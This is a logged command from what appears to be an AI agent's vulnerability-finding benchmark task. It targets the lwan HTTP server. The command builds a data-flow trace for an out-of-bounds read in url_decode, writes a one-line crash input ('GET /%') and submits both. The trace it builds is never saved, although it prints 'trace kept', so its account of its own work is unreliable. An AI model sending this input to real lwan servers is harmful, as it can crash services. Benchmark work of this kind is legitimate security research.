message:
Command `cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/candidate_trace.json')
trace=[
{"step":1,"file":"src-vul/lwan/src/bin/fuzz/request_fuzzer.cc","function":"LLVMFuzzerTestOneInput","line":7,"var":"data,size","code":"return fuzz_parse_http_request(data, size);","note":"Attacker-controlled bytes from the fuzzer are forwarded unchanged into the HTTP request parser entry point.","depends_on":[{"on":1,"type":"data","via":"argument"}]},
{"step":2,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1631,"var":"data_copy","code":"memcpy(data_copy, data, length);","note":"The raw input is copied into a mutable buffer so the parser can edit it in place.","depends_on":[{"on":1,"type":"data","via":"copy"}]},
{"step":3,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1645,"var":"request","code":"parse_http_request(&request)","note":"The crafted buffer is wrapped in request state and handed to the HTTP parser.","depends_on":[{"on":2,"type":"data","via":"buffer"}]},
{"step":4,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"parse_http_request","line":1193,"var":"request->url.value","code":"ssize_t decoded_len = url_decode(request->url.value);","note":"After request-line parsing, the URL string is decoded in place; malformed percent-encoding can drive the decoder past the end of the attacker-controlled string.","depends_on":[{"on":3,"type":"data","via":"request url"}]},
{"step":5,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"url_decode","line":312,"var":"ch[1], ch[2]","code":"char tmp = (char)(decode_hex_digit(ch[1]) << 4 | decode_hex_digit(ch[2]));","note":"When a '%' appears near the end of the string, the decoder reads the next two bytes without first checking that they exist, causing an out-of-bounds read and ASAN crash.","depends_on":[{"on":4,"type":"data","via":"percent-escape parsing"}]}
]
p.write_text(Path('/workspace/candidate_trace.json').read_text())
print('trace kept')
PY
printf 'GET /%% HTTP/1.1\r\nHost: x\r\n\r\n' > /workspace/poc1 && bash /workspace/submit.sh /workspace/poc1 /workspace/candidate_trace.json` executed with exit code -1.
